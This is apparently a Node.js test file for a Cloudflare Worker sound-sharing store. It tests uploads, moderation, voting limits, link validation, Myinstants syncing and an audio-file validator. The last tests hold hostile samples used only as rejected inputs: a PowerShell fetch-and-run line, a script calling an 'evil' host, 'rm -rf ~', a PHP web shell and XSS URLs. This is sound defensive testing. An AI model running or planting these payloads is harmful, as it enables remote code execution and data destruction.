// Run: node --test test/   (Node 22.5+: a real SQLite stands in for D1, a Map for KV)
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { DatabaseSync } from "node:sqlite";
import worker, { prune } from "../src/index.js";
import { jobs, parseMyinstants } from "../src/sync.js";
import { audioType } from "../src/audio.js";

const SCHEMA = readFileSync(new URL("../schema.sql", import.meta.url), "utf8");
const TOKEN = "t".repeat(40);
const INSTALL = "0123456789abcdef0123";

// D1's calls on top of node:sqlite: prepare().bind().first() / all() / run()
class FakeD1 {
  constructor() { this.db = new DatabaseSync(":memory:"); this.db.exec(SCHEMA); }
  prepare(sql) {
    const db = this.db;
    let args = [];
    const st = {
      bind(...a) { args = a; return st; },
      async first() { return db.prepare(sql).get(...args) ?? null; },
      async all() { return { results: db.prepare(sql).all(...args) }; },
      async run() { db.prepare(sql).run(...args); return { success: true }; },
    };
    return st;
  }
  async batch(stmts) { for (const st of stmts) await st.run(); }
  rows(sql, ...a) { return this.db.prepare(sql).all(...a); }
}

class FakeKV {
  constructor() { this.m = new Map(); }
  async get(k) { const v = this.m.get(k); return v ? v.buffer.slice(v.byteOffset, v.byteOffset + v.byteLength) : null; }
  async put(k, v) { this.m.set(k, new Uint8Array(v)); }
  async delete(k) { this.m.delete(k); }
}

function store() {
  return { DB: new FakeD1(), FILES: new FakeKV(), SALT: "salt", ADMIN_TOKEN: TOKEN };
}

async function call(env, path, { method = "GET", json, form, ip = "1.1.1.1", install = INSTALL,
                                 admin = false, headers = {} } = {}) {
  const h = { "cf-connecting-ip": ip, ...headers };
  if (install) h["x-onion-install"] = install;
  if (admin) h.authorization = `Bearer ${admin === true ? TOKEN : admin}`;
  let body;
  if (json !== undefined) { body = JSON.stringify(json); h["content-type"] = "application/json"; }
  if (form) {   // a real multipart body with its length, as the app sends it
    const fd = new FormData();
    for (const [k, v] of Object.entries(form)) fd.append(k, v);
    const r = new Request("https://x/", { method: "POST", body: fd });
    body = new Uint8Array(await r.arrayBuffer());
    h["content-type"] = r.headers.get("content-type");
    h["content-length"] = String(body.length);
  }
  const res = await worker.fetch(new Request("https://store.test" + path, { method, headers: h, body }), env);
  const type = res.headers.get("content-type") || "";
  return { status: res.status, headers: res.headers,
           body: type.startsWith("application/json") ? await res.json() : await res.arrayBuffer() };
}

let n = 0;
// a real (silent) MP3: an ID3 tag that makes each file different, then whole frames
const FRAME = 417;   // MPEG 1 layer III, 128 kbit/s, 44.1 kHz
function mp3bytes(extra = 0, tagText = "") {
  const text = new TextEncoder().encode(tagText);
  const tagLen = 16 + text.length, frames = 3 + Math.ceil(extra / FRAME);
  const b = new Uint8Array(10 + tagLen + frames * FRAME);
  b.set([0x49, 0x44, 0x33, 3, 0, 0, (tagLen >> 21) & 127, (tagLen >> 14) & 127, (tagLen >> 7) & 127, tagLen & 127]);
  new DataView(b.buffer).setUint32(10, ++n);
  b.set(text, 26);
  for (let i = 0; i < frames; i++) b.set([0xff, 0xfb, 0x90, 0x00], 10 + tagLen + i * FRAME);
  return b;
}
function mp3(extra = 0) {   // a different file each time, so none is a duplicate
  return new Blob([mp3bytes(extra)], { type: "audio/mpeg" });
}

const share = (env, name = "boom", opts = {}) => call(env, "/v1/sounds", { method: "POST",
  form: { file: mp3(), name, tags: "funny, #Meme", agree: "own-cc0-v1" }, ...opts });

async function live(env, name = "boom", opts = {}) {
  const up = await share(env, name, opts);
  assert.equal(up.status, 201, JSON.stringify(up.body));
  const ok = await call(env, `/v1/admin/sounds/${up.body.id}`, { method: "POST", admin: true, json: { action: "approve" } });
  assert.equal(ok.status, 200);
  return up.body.id;
}

const log = env => env.DB.rows("SELECT * FROM actions ORDER BY id");

test("an upload waits for review, then goes live; both are logged with hashes only", async () => {
  const env = store();
  const up = await share(env, "  big\u0007   boom  ");
  assert.equal(up.status, 201);
  assert.equal(up.body.status, "pending");
  assert.equal((await call(env, "/v1/sounds")).body.sounds.length, 0);
  assert.equal((await call(env, `/v1/sounds/${up.body.id}/file`)).status, 404);
  await call(env, `/v1/admin/sounds/${up.body.id}`, { method: "POST", admin: true, json: { action: "approve" } });
  const list = (await call(env, "/v1/sounds")).body;
  assert.equal(list.sounds.length, 1);
  assert.equal(list.sounds[0].name, "big boom");
  assert.deepEqual(list.sounds[0].tags, ["funny", "meme"]);
  assert.ok(!("uploader" in list.sounds[0]) && !("ip" in list.sounds[0]));
  const f = await call(env, `/v1/sounds/${up.body.id}/file`);
  assert.equal(f.status, 200);
  assert.equal(f.headers.get("content-type"), "audio/mpeg");
  assert.equal(f.headers.get("cache-control"), "public, max-age=3600");
  const rows = log(env);
  assert.deepEqual(rows.map(r => r.kind), ["upload", "approve"]);
  assert.match(rows[0].ip, /^[0-9a-f]{64}$/);
  assert.match(rows[0].install, /^[0-9a-f]{64}$/);
  assert.equal(rows[1].ip, "owner");
  assert.equal(rows[1].detail, "was pending");
  // nothing anywhere keeps the raw address or install id
  const dump = JSON.stringify([env.DB.rows("SELECT * FROM sounds"), rows,
    env.DB.rows("SELECT * FROM counters")]);
  assert.ok(!dump.includes("1.1.1.1") && !dump.includes(INSTALL));
});

test("uploads are checked: agreement, name, audio bytes, size, length, duplicates", async () => {
  const env = store();
  const bad = async form => (await call(env, "/v1/sounds", { method: "POST", form })).status;
  assert.equal(await bad({ file: mp3(), name: "x", agree: "nope" }), 400);
  assert.equal(await bad({ file: mp3(), name: "   ", agree: "own-cc0-v1" }), 400);
  assert.equal(await bad({ file: new Blob(["<html>not a sound at all</html>"]), name: "x", agree: "own-cc0-v1" }), 415);
  assert.equal(await bad({ file: mp3(4 << 20), name: "x", agree: "own-cc0-v1" }), 413);
  assert.equal(await bad({ name: "x", agree: "own-cc0-v1" }), 400);
  const nolen = await worker.fetch(new Request("https://store.test/v1/sounds", { method: "POST",
    headers: { "x-onion-install": INSTALL }, body: "x" }), env);
  assert.equal(nolen.status, 411);
  const big = await call(env, "/v1/sounds", { method: "POST", headers: { "content-length": String(5 << 20) } });
  assert.equal(big.status, 413);
  const file = mp3();
  const ok = await call(env, "/v1/sounds", { method: "POST", form: { file, name: "a", agree: "own-cc0-v1" } });
  assert.equal(ok.status, 201);
  const dup = await call(env, "/v1/sounds", { method: "POST", form: { file, name: "b", agree: "own-cc0-v1" } });
  assert.equal(dup.status, 409);
  assert.equal((await call(env, "/v1/sounds", { method: "POST", install: "", form: { file: mp3(), name: "c", agree: "own-cc0-v1" } })).status, 400);
  assert.equal(log(env).length, 1);   // only the one that got in
});

test("10 uploads a day per install, 20 per address; one 'limit' line per day", async () => {
  const env = store();
  for (let i = 0; i < 10; i++) assert.equal((await share(env, `s${i}`)).status, 201);
  assert.equal((await share(env, "s10")).status, 429);
  assert.equal((await share(env, "s11")).status, 429);
  let limits = log(env).filter(r => r.kind === "limit");
  assert.equal(limits.length, 1);
  assert.equal(limits[0].detail, "upload");
  assert.match(limits[0].install, /^[0-9a-f]{64}$/);
  // a fresh install id from the same address gets 10 more, then the address is full
  for (let i = 0; i < 10; i++)
    assert.equal((await share(env, `t${i}`, { install: "fedcba9876543210fedc" })).status, 201);
  assert.equal((await share(env, "t10", { install: "aaaaaaaaaaaaaaaaaaaa" })).status, 429);
  limits = log(env).filter(r => r.kind === "limit");
  assert.equal(limits.at(-1).detail, "upload-ip");
  assert.match(limits.at(-1).ip, /^[0-9a-f]{64}$/);
});

test("votes: one per install, changeable, 0 takes it back, only on live sounds", async () => {
  const env = store();
  const id = await live(env);
  const v = (value, opts) => call(env, `/v1/sounds/${id}/vote`, { method: "POST", json: { value }, ...opts });
  assert.deepEqual((await v(1)).body, { id, up: 1, down: 0, mine: 1 });
  assert.deepEqual((await v(1)).body, { id, up: 1, down: 0, mine: 1 });
  assert.deepEqual((await v(-1)).body, { id, up: 0, down: 1, mine: -1 });
  assert.equal((await v(-1, { install: "fedcba9876543210fedc", ip: "2.2.2.2" })).body.down, 2);
  assert.deepEqual((await v(0)).body, { id, up: 0, down: 1, mine: 0 });
  assert.equal((await v(5)).status, 400);
  assert.equal((await v("1")).status, 400);
  assert.equal((await call(env, `/v1/sounds/${id}/vote`, { method: "POST", json: { value: 1 }, install: "" })).status, 400);
  assert.equal((await call(env, "/v1/sounds/abcdefabcdef/vote", { method: "POST", json: { value: 1 } })).status, 404);
  const mine = (await call(env, "/v1/sounds", { install: "fedcba9876543210fedc" })).body.sounds[0].mine;
  assert.equal(mine, -1);
  assert.deepEqual(log(env).filter(r => r.kind === "vote").map(r => r.detail), ["1", "1", "-1", "-1", "0"]);
});

test("one address can't stuff a sound's votes with made-up installs", async () => {
  const env = store();
  const id = await live(env);
  let ok = 0;
  for (let i = 0; i < 10; i++) {
    const r = await call(env, `/v1/sounds/${id}/vote`, { method: "POST", json: { value: 1 },
      install: `${i}`.padStart(20, "0") });
    if (r.status === 200) ok++;
  }
  assert.equal(ok, 3);
  const lim = log(env).filter(r => r.kind === "limit");
  assert.deepEqual(lim.map(r => r.detail), ["vote-installs", "vote-ip-sound"]);
  assert.ok(lim.every(r => r.sound === id));
  // the next day the daily counters are gone, but the same address still can't add installs
  env.DB.db.exec("DELETE FROM counters");
  const again = await call(env, `/v1/sounds/${id}/vote`, { method: "POST", json: { value: 1 }, install: "f".repeat(20) });
  assert.equal(again.status, 429);
  assert.equal(log(env).filter(r => r.kind === "limit").length, 2);   // logged once, not again
  // the three who voted can still change their minds, and taking one back frees no place
  const first = "0".repeat(20);
  assert.equal((await call(env, `/v1/sounds/${id}/vote`, { method: "POST", json: { value: -1 }, install: first })).body.down, 1);
  assert.equal((await call(env, `/v1/sounds/${id}/vote`, { method: "POST", json: { value: 0 }, install: first })).status, 200);
  assert.equal((await call(env, `/v1/sounds/${id}/vote`, { method: "POST", json: { value: 1 }, install: "e".repeat(20) })).status, 429);
  // another address isn't affected
  assert.equal((await call(env, `/v1/sounds/${id}/vote`, { method: "POST", json: { value: 1 }, install: "e".repeat(20), ip: "8.8.8.8" })).status, 200);
});

test("the review queue refuses more once it holds 300 MB of files", async () => {
  const env = store();
  env.DB.db.prepare("INSERT INTO sounds (id, name, ext, size, sha256, uploader, ip, status, created) " +
    "VALUES ('aaaaaaaaaaaa', 'big', 'mp3', ?, 'x', 'u', 'i', 'pending', 0)").run((300 << 20) - 10);
  const r = await share(env);
  assert.equal(r.status, 503);
  assert.equal(r.body.error, "queue full");
  // a link has no file: it still fits
  const l = await call(env, "/v1/links", { method: "POST", json: { link: "https://youtu.be/q1q1q1q1q1q", name: "x", agree: "link-v1" } });
  assert.equal(l.status, 201);
  // approving the big one makes room
  await call(env, "/v1/admin/sounds/aaaaaaaaaaaa", { method: "POST", admin: true, json: { action: "approve" } });
  assert.equal((await share(env)).status, 201);
});

test("3 reports from different addresses take a sound off; one address counts once", async () => {
  const env = store();
  const id = await live(env);
  const rep = (ip, reason = "copyright") => call(env, `/v1/sounds/${id}/report`, { method: "POST", json: { reason }, ip });
  await rep("9.9.9.1"); await rep("9.9.9.1"); await rep("9.9.9.1", "weird<script>");
  assert.equal(env.DB.rows("SELECT status, reports FROM sounds")[0].reports, 1);
  await rep("9.9.9.2");
  assert.equal((await call(env, "/v1/sounds")).body.sounds.length, 1);
  await rep("9.9.9.3", "offensive");
  assert.equal((await call(env, "/v1/sounds")).body.sounds.length, 0);
  assert.equal((await rep("9.9.9.4")).status, 404);   // off the store now
  const q = (await call(env, "/v1/admin/queue", { admin: true })).body.sounds[0];
  assert.equal(q.reports, 3);
  assert.deepEqual(q.why.split(",").sort(), ["copyright", "copyright", "offensive"]);
  const kinds = log(env).map(r => r.kind);
  assert.equal(kinds.filter(k => k === "report").length, 5);
  assert.equal(kinds.filter(k => k === "hidden").length, 1);
  assert.ok(log(env).filter(r => r.kind === "report").every(r => ["copyright", "offensive", "other"].includes(r.detail)));
  // approving again clears the old reports
  await call(env, `/v1/admin/sounds/${id}`, { method: "POST", admin: true, json: { action: "approve" } });
  assert.equal(env.DB.rows("SELECT count(*) AS n FROM reports")[0].n, 0);
  assert.equal((await call(env, "/v1/sounds")).body.sounds.length, 1);
});

test("admin routes need the exact token", async () => {
  const env = store();
  for (const admin of [false, "wrong", TOKEN + "x", TOKEN.slice(1) + "u"])
    assert.equal((await call(env, "/v1/admin/queue", { admin })).status, 401, String(admin));
  assert.equal((await call(env, "/v1/admin/log", { admin: "nope" })).status, 401);
  assert.equal((await call({ ...env, ADMIN_TOKEN: "" }, "/v1/admin/queue", { admin: "" })).status, 401);
  assert.equal((await call(env, "/v1/admin/queue", { admin: true })).status, 200);
});

test("reject deletes the file for good; rename is logged with both names", async () => {
  const env = store();
  const id = await live(env, "old name");
  const act = json => call(env, `/v1/admin/sounds/${id}`, { method: "POST", admin: true, json });
  assert.equal((await act({ action: "rename", name: "  new\nname " })).status, 200);
  assert.equal((await act({ action: "rename", name: " " })).status, 400);
  assert.equal((await act({ action: "explode" })).status, 400);
  assert.equal(env.FILES.m.size, 1);
  assert.equal((await act({ action: "reject" })).status, 200);
  assert.equal(env.FILES.m.size, 0);
  assert.equal((await call(env, `/v1/sounds/${id}/file`)).status, 404);
  assert.equal((await call(env, `/v1/admin/sounds/${id}/file`, { admin: true })).status, 404);
  assert.equal((await act({ action: "approve" })).status, 409);
  assert.equal((await call(env, "/v1/admin/sounds/abcdefabcdef", { method: "POST", admin: true, json: { action: "approve" } })).status, 404);
  const rows = log(env).filter(r => r.ip === "owner");
  assert.deepEqual(rows.map(r => [r.kind, r.detail]),
    [["approve", "was pending"], ["rename", "old name -> new name"], ["reject", "was live"]]);
});

test("the admin can hear a waiting sound; the public can't, and live files are cached", async () => {
  const env = store();
  const id = (await share(env)).body.id;
  assert.equal((await call(env, `/v1/sounds/${id}/file`)).status, 404);
  const a = await call(env, `/v1/admin/sounds/${id}/file`, { admin: true });
  assert.equal(a.status, 200);
  assert.equal(a.headers.get("cache-control"), "no-store");
  assert.equal(a.headers.get("x-content-type-options"), "nosniff");
});

test("links: known sites only, https only, one video written one way", async () => {
  const env = store();
  const link = (url, extra = {}) => call(env, "/v1/links", { method: "POST",
    json: { link: url, name: "clip", agree: "link-v1", ...extra } });
  assert.equal((await link("https://youtu.be/abc123")).status, 201);
  assert.equal((await link("https://www.youtube.com/watch?v=abc123&t=5")).status, 409);
  assert.equal((await link("https://m.youtube.com/shorts/abc123")).status, 409);
  for (const bad of ["https://youtube.com/watch?v=<script>alert(1)</script>", 'https://youtu.be/a"onload="x',
                     "https://youtube.com/watch?v=abc",
                     "http://youtube.com/watch?v=zz", "https://evil.com/a.mp3", "https://youtube.com.evil.com/x",
                     "https://" + ["u:p", "youtube.com/watch?v=q"].join("@"), "https://youtube.com:8443/watch?v=q",
                     "javascript:alert(1)", "https://notyoutube.com/x", "https://youtube.com/" + "a".repeat(600)])
    assert.equal((await link(bad)).status, 415, bad);
  assert.equal((await link("https://soundcloud.com/a/b", { agree: "own-cc0-v1" })).status, 400);
  assert.equal((await call(env, "/v1/links", { method: "POST", body: "x", headers: { "content-type": "application/json" } })).status, 400);
  const row = env.DB.rows("SELECT * FROM sounds")[0];
  assert.equal(row.link, "https://youtube.com/watch?v=abc123");
  assert.equal(row.ext, "link");
  assert.equal((await call(env, `/v1/admin/sounds/${row.id}/file`, { admin: true })).status, 404);
  // a rejected link can come back (there's no file to lose)
  await call(env, `/v1/admin/sounds/${row.id}`, { method: "POST", admin: true, json: { action: "reject" } });
  assert.equal((await call(env, `/v1/admin/sounds/${row.id}`, { method: "POST", admin: true, json: { action: "approve" } })).status, 200);
  assert.deepEqual(log(env).map(r => r.kind), ["link", "reject", "approve"]);
});

test("search treats % and _ as plain text; sort by top and new", async () => {
  const env = store();
  const a = await live(env, "100% real");
  const b = await live(env, "bruh moment");
  await call(env, `/v1/sounds/${a}/vote`, { method: "POST", json: { value: 1 } });
  const names = async q => (await call(env, "/v1/sounds" + q)).body.sounds.map(s => s.name);
  assert.deepEqual(await names("?q=%25"), ["100% real"]);
  assert.deepEqual(await names("?q=_"), []);
  assert.deepEqual(await names("?q=MEME"), ["100% real", "bruh moment"]);
  assert.deepEqual(await names("?sort=top"), ["100% real", "bruh moment"]);
  env.DB.db.prepare("UPDATE sounds SET created = created + 10 WHERE id = ?").run(b);
  assert.deepEqual(await names("?sort=new"), ["bruh moment", "100% real"]);
  assert.equal((await call(env, "/v1/sounds?offset=-5")).status, 200);
});

test("the queue: any status, search by name or id, counts per status", async () => {
  const env = store();
  const a = await live(env, "alpha");
  await share(env, "beta");
  const q = async s => (await call(env, "/v1/admin/queue" + s, { admin: true })).body;
  assert.deepEqual((await q("")).sounds.map(s => s.name), ["beta"]);
  assert.deepEqual((await q("?status=all")).sounds.map(s => s.name).sort(), ["alpha", "beta"]);
  assert.deepEqual((await q(`?status=all&q=${a}`)).sounds.map(s => s.name), ["alpha"]);
  assert.deepEqual((await q("?status=bogus")).sounds.map(s => s.name), ["beta"]);
  const all = await q("?status=all");
  assert.deepEqual(all.counts, { live: 1, pending: 1 });
  assert.match(all.sounds[0].ip, /^[0-9a-f]{64}$/);
  assert.equal(all.more, false);
});

test("the log reads newest first, filters, pages, and the cron drops old rows", async () => {
  const env = store();
  const id = await live(env, "one");
  await call(env, `/v1/sounds/${id}/vote`, { method: "POST", json: { value: 1 }, ip: "3.3.3.3" });
  await share(env, "two", { ip: "4.4.4.4" });
  const get = async s => (await call(env, "/v1/admin/log" + s, { admin: true })).body;
  const all = await get("");
  assert.deepEqual(all.actions.map(a => a.kind), ["upload", "vote", "approve", "upload"]);
  assert.equal(all.actions.at(-1).name, "one");
  assert.equal(all.keep_days, 90);
  assert.deepEqual((await get("?kind=vote")).actions.map(a => a.sound), [id]);
  assert.equal((await get(`?sound=${id}`)).actions.length, 3);
  const voter = all.actions[1].ip;
  assert.deepEqual((await get(`?who=${voter}`)).actions.map(a => a.kind), ["vote"]);
  assert.equal((await get(`?who=${all.actions[1].install}`)).actions.length, 3);   // one install, all but the review
  assert.equal((await get("?who=owner")).actions.length, 1);
  assert.equal((await get("?who=1' OR 1=1")).actions.length, 4);   // a bad filter is ignored, not run
  const page = await get("?limit=2");
  assert.equal(page.more, true);
  assert.deepEqual((await get(`?before=${page.actions[1].id}`)).actions.map(a => a.kind), ["approve", "upload"]);
  // 91 days later the cron drops these, and old rate-limit counters with them
  const later = Math.floor(Date.now() / 1000) + 91 * 86400;
  env.DB.db.prepare("INSERT INTO actions (at, kind) VALUES (?, 'vote')").run(later);
  await prune(env, later);
  assert.deepEqual(env.DB.rows("SELECT at FROM actions").map(r => r.at), [later]);
  assert.equal(env.DB.rows("SELECT count(*) AS n FROM counters")[0].n, 0);
  await worker.scheduled({}, env);   // the cron entry point runs
});

test("a log that can't be written never breaks the store", async () => {
  const env = store();
  env.DB.db.exec("DROP TABLE actions");
  const err = console.error;
  console.error = () => {};
  try {
    assert.equal((await share(env)).status, 201);
  } finally { console.error = err; }
});

test("unknown routes and the review page", async () => {
  const env = store();
  assert.equal((await call(env, "/nope")).status, 404);
  assert.equal((await call(env, "/v1/sounds/ZZZ/file")).status, 404);
  assert.equal((await call(env, "/v1/admin/nope", { admin: true })).status, 404);
  const page = await call(env, "/admin");
  assert.equal(page.status, 200);
  assert.match(page.headers.get("content-security-policy"), /frame-ancestors 'none'/);
});

// ------------------------------------------------------------------ sites synced in

const button = (file, title) => `<div class="instant"><button class="small-button" ` +
  `onclick="play('/media/sounds/${file}.mp3', 'loader-1', 'x')"></button>` +
  `<a href="/en/instant/${file}/" class="instant-link link-secondary">${title}</a></div>`;
const PAGES = {
  trending: button("vine-boom", "VINE BOOM") + button("bruh", "Bruh &amp; co"),
  games: button("roblox-oof", "ROBLOX oof") + button("vine-boom", "Vine boom (games)") +
         button("roblox-oof", "dupe on the page") + button("mario", "Mario jump"),
};

function fakeSite(calls = []) {
  return async url => {
    calls.push(url);
    if (url.includes("/en/index/")) return new Response(PAGES.trending);
    if (url.includes("/categories/games/")) return new Response(PAGES.games);
    return new Response("<html>nothing</html>");
  };
}

async function step(env, fetcher = fakeSite()) {
  const real = globalThis.fetch;
  globalThis.fetch = fetcher;
  try {
    return await call(env, "/v1/admin/sync", { method: "POST", admin: true });
  } finally { globalThis.fetch = real; }
}

test("Myinstants' page is read for each button's name and MP3, once each", () => {
  const hits = parseMyinstants(PAGES.games);
  assert.deepEqual(hits.map(h => h.title), ["ROBLOX oof", "Vine boom (games)", "Mario jump"]);
  assert.equal(hits[0].link, "https://www.myinstants.com/media/sounds/roblox-oof.mp3");
  assert.equal(parseMyinstants(PAGES.trending)[1].title, "Bruh & co");
  assert.equal(jobs().length, 50);
  assert.ok(jobs()[0][1].includes("/categories/games/us/?page=1"));
});

test("a sync step adds Myinstants' sounds as live links with a category, never twice", async () => {
  const env = store();
  const calls = [];
  const r = await step(env, fakeSite(calls));
  assert.equal(r.status, 200);
  assert.equal(r.body.added, 4);   // 2 trending + roblox + mario (vine boom is the same link)
  assert.equal(calls.length, 2);
  const rows = env.DB.rows("SELECT * FROM sounds ORDER BY name");
  assert.ok(rows.every(s => s.status === "live" && s.ext === "link" && s.source === "myinstants" && s.author === "Myinstants"));
  const byName = Object.fromEntries(rows.map(s => [s.name, s]));
  assert.equal(byName["ROBLOX oof"].cat, "games");
  assert.equal(byName["ROBLOX oof"].link, "https://myinstants.com/media/sounds/roblox-oof.mp3");
  assert.equal(byName["VINE BOOM"].cat, "games");   // a trending one learns its category
  assert.ok(byName["VINE BOOM"].hot > byName["Bruh & co"].hot);
  assert.ok(byName["ROBLOX oof"].pop > byName["Mario jump"].pop);
  // the first cycle doesn't fill New with them
  assert.ok(byName["ROBLOX oof"].created < Date.now() / 1000 - 29 * 86400);
  assert.equal(env.DB.rows("SELECT value FROM sync")[0].value, "1:0");
  assert.equal(log(env).filter(a => a.kind === "sync").length, 1);
  // the same pages again: nothing new, nothing logged
  env.DB.db.exec("UPDATE sync SET value = '0:0'");
  assert.equal((await step(env)).body.added, 0);
  assert.equal(env.DB.rows("SELECT count(*) AS n FROM sounds")[0].n, 4);
  assert.equal(log(env).filter(a => a.kind === "sync").length, 1);
});

test("a synced sound the owner rejected, or people reported, stays that way", async () => {
  const env = store();
  await step(env);
  const oof = env.DB.rows("SELECT id FROM sounds WHERE name = 'ROBLOX oof'")[0].id;
  await call(env, `/v1/admin/sounds/${oof}`, { method: "POST", admin: true, json: { action: "reject" } });
  env.DB.db.exec("UPDATE sync SET value = '0:0'");
  await step(env);
  assert.equal(env.DB.rows("SELECT status FROM sounds WHERE id = ?", oof)[0].status, "rejected");
  // and a link someone already shared isn't added again under Myinstants' name
  const env2 = store();
  await call(env2, "/v1/links", { method: "POST", json: { link: "https://www.myinstants.com/media/sounds/mario.mp3", name: "my mario", agree: "link-v1" } });
  await step(env2);
  assert.deepEqual(env2.DB.rows("SELECT name, status FROM sounds WHERE link LIKE '%mario%'").map(r => ({ ...r })),
                   [{ name: "my mario", status: "pending" }]);
});

test("a site that's down is logged and the cycle moves on", async () => {
  const env = store();
  const r = await step(env, async () => new Response("no", { status: 503 }));
  assert.equal(r.status, 200);
  assert.match(r.body.note, /failed/);
  assert.equal(env.DB.rows("SELECT value FROM sync")[0].value, "1:0");
  assert.deepEqual(log(env).map(a => a.kind), ["sync", "sync"]);   // trending and the page
});

test("the cron runs a sync step every 10 minutes and the clean-up once a day", async () => {
  const env = store();
  const real = globalThis.fetch;
  globalThis.fetch = fakeSite();
  try {
    await worker.scheduled({ cron: "*/10 * * * *" }, env);
    assert.equal(env.DB.rows("SELECT count(*) AS n FROM sounds")[0].n, 4);
    await worker.scheduled({ cron: "17 3 * * *" }, env);
    assert.equal(env.DB.rows("SELECT count(*) AS n FROM sounds")[0].n, 4);
  } finally { globalThis.fetch = real; }
});

test("categories: a filter, counts for the chips, and the store's own sounds mixed in", async () => {
  const env = store();
  await step(env);
  const ours = await live(env, "Air horn");
  env.DB.db.prepare("UPDATE sounds SET cat = 'memes' WHERE id = ?").run(ours);
  const names = async q => (await call(env, "/v1/sounds" + q)).body.sounds.map(s => s.name);
  assert.deepEqual((await names("?cat=games")).sort(), ["Mario jump", "ROBLOX oof", "VINE BOOM"]);
  assert.deepEqual(await names("?cat=memes"), ["Air horn"]);
  assert.equal((await names("?cat=nope")).length, 5);   // an unknown one is ignored
  const c = (await call(env, "/v1/categories")).body;
  assert.deepEqual(c.categories.map(r => ({ ...r })), [{ cat: "games", n: 3 }, { cat: "memes", n: 1 }]);
  assert.equal(c.total, 5);
  const one = (await call(env, "/v1/sounds?cat=games")).body.sounds[0];
  assert.equal(one.source, "myinstants");
  assert.equal(one.cat, "games");
  // Top: no votes yet, so popularity on the site, with the store's own sounds mid-way
  const top = await names("");
  assert.ok(top.indexOf("Air horn") > top.indexOf("ROBLOX oof"));
  // a thumbs up lifts any sound above the rest
  const mario = env.DB.rows("SELECT id FROM sounds WHERE name = 'Mario jump'")[0].id;
  await call(env, `/v1/sounds/${mario}/vote`, { method: "POST", json: { value: 1 } });
  assert.equal((await names(""))[0], "Mario jump");
});

test("Trending: hot on the site now, plus this week's thumbs up here", async () => {
  const env = store();
  await step(env);
  const names = async () => (await call(env, "/v1/sounds?sort=trending")).body.sounds.map(s => s.name);
  assert.deepEqual((await names()).slice(0, 2), ["VINE BOOM", "Bruh & co"]);
  const mario = env.DB.rows("SELECT id FROM sounds WHERE name = 'Mario jump'")[0].id;
  for (let i = 0; i < 4; i++)
    await call(env, `/v1/sounds/${mario}/vote`, { method: "POST", json: { value: 1 }, ip: `5.5.5.${i}`, install: `${i}`.padStart(20, "7") });
  assert.equal((await names())[0], "VINE BOOM");   // 1000 hot vs 160
  env.DB.db.exec("UPDATE sounds SET hot = 0");     // hours later, nothing's trending there
  assert.equal((await names())[0], "Mario jump");
});

// ------------------------------------------------------------------ files that aren't sounds

const enc = s => new TextEncoder().encode(s);
const cat = (...parts) => {
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let i = 0;
  for (const p of parts) { out.set(p, i); i += p.length; }
  return out;
};
function wav(samples = 4000, extraChunk = null) {
  const fmt = new Uint8Array(24), data = new Uint8Array(8 + samples * 2);
  fmt.set(enc("fmt ")); const f = new DataView(fmt.buffer);
  f.setUint32(4, 16, true); f.setUint16(8, 1, true); f.setUint16(10, 1, true);
  f.setUint32(12, 44100, true); f.setUint32(16, 88200, true); f.setUint16(20, 2, true); f.setUint16(22, 16, true);
  data.set(enc("data")); new DataView(data.buffer).setUint32(4, samples * 2, true);
  const body = cat(enc("WAVE"), fmt, ...(extraChunk ? [extraChunk] : []), data);
  const head = new Uint8Array(8); head.set(enc("RIFF")); new DataView(head.buffer).setUint32(4, body.length, true);
  return cat(head, body);
}
function oggPage(packet) {
  const segs = [];
  for (let n = packet.length; ; n -= 255) { segs.push(Math.min(255, n)); if (n < 255) break; }
  const head = new Uint8Array(27 + segs.length);
  head.set(enc("OggS")); head[26] = segs.length; head.set(segs, 27);
  return cat(head, packet);
}
function flac(metaLen = 0) {
  const info = new Uint8Array(4 + 34); info[0] = metaLen ? 0 : 0x80; info[3] = 34;
  const pad = metaLen ? new Uint8Array(4 + metaLen) : new Uint8Array(0);
  if (metaLen) { pad[0] = 0x81; pad[1] = metaLen >> 16; pad[2] = (metaLen >> 8) & 255; pad[3] = metaLen & 255; }
  return cat(enc("fLaC"), info, pad, new Uint8Array([0xff, 0xf8, 0x69, 0x08]), new Uint8Array(200));
}

test("real sounds of each kind pass the whole-file check", () => {
  assert.equal(audioType(mp3bytes()), "mp3");
  assert.equal(audioType(mp3bytes(0).slice(26)), "mp3");   // no ID3 tag, frames only
  const v1 = new Uint8Array(128); v1.set(enc("TAG"));
  assert.equal(audioType(cat(mp3bytes(), v1)), "mp3");     // an ID3v1 tag at the end
  assert.equal(audioType(wav()), "wav");
  assert.equal(audioType(cat(oggPage(cat(enc("OpusHead"), new Uint8Array(11))), oggPage(new Uint8Array(300)))), "ogg");
  assert.equal(audioType(flac()), "flac");
});

test("a sound's header in front of something else is refused", () => {
  const exe = cat(enc("MZ"), new Uint8Array(100), enc("This program cannot be run in DOS mode."), new Uint8Array(4000));
  const id3 = new Uint8Array([0x49, 0x44, 0x33, 3, 0, 0, 0, 0, 0, 0]);
  // only a header, then a program, a script, junk
  assert.equal(audioType(cat(id3, exe)), "");
  assert.equal(audioType(cat(id3, enc("powershell -c iwr http://x | iex"), new Uint8Array(500))), "");
  assert.equal(audioType(cat(id3, new Uint8Array(4000).fill(0x41))), "");
  assert.equal(audioType(cat(enc("RIFF\0\0\0\0WAVE"), exe)), "");
  assert.equal(audioType(cat(enc("OggS"), exe)), "");
  assert.equal(audioType(cat(enc("fLaC"), exe)), "");
  // a real sound with a program or a script tacked on after it
  assert.equal(audioType(cat(mp3bytes(), exe)), "");
  assert.equal(audioType(cat(wav(), exe)), "");
  assert.equal(audioType(cat(oggPage(cat(enc("\x01vorbis"), new Uint8Array(23))), exe)), "");
  // ... or hidden in its tags and chunks
  assert.equal(audioType(mp3bytes(0, "<script>fetch('//evil')</script>")), "");
  assert.equal(audioType(mp3bytes(0, "#!/bin/sh\nrm -rf ~")), "");
  const chunk = cat(enc("LIST"), new Uint8Array([20, 0, 0, 0]), enc("<?php system($_GET[1]); "));
  assert.equal(audioType(wav(4000, chunk)), "");
  // a huge "tag" is a place to hide something: not taken
  assert.equal(audioType(mp3bytes(0, "x".repeat(3 << 20))), "");
  assert.equal(audioType(flac(3 << 20)), "");
  const fat = cat(enc("junk"), new Uint8Array([0, 0, 48, 0]), new Uint8Array(48 << 16));
  assert.equal(audioType(wav(4000, fat)), "");
  // a field that runs off the end
  assert.equal(audioType(cat(enc("RIFF\0\0\0\0WAVEfmt "), new Uint8Array([255, 255, 0, 0]), new Uint8Array(10))), "");
});

